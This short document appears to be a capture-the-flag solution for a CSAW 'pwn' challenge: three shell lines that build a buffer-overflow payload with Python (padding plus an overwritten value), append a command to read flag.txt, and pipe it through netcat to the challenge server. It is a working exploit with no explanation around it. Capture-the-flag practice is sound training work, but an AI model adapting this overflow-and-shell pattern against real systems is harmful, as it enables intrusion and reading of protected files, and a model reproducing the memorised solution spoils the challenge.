python -c "from struct import pack; print 'A' * 20 + pack('I', 0xcaf3baee)" > payload
echo 'cat flag.txt' >> payload
cat payload - | nc pwn.chal.csaw.io 9000
